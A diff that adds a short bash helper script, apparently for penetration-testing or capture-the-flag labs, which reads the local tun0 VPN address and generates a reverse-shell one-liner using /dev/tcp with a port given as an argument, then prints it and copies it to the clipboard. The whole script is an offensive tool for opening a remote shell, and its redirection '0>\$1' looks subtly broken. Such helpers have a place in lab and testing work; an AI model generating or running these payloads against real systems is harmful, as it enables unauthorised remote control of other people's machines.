@@ -1,0 +1,7 @@
+#!/bin/bash
+
+IP=$(ip addr show tun0 | grep -oP 'inet \K[\d.]+')
+SHELL="sh -i >& /dev/tcp/$IP/$1 0>\$1"
+
+echo $SHELL
+echo $SHELL | wl-copy
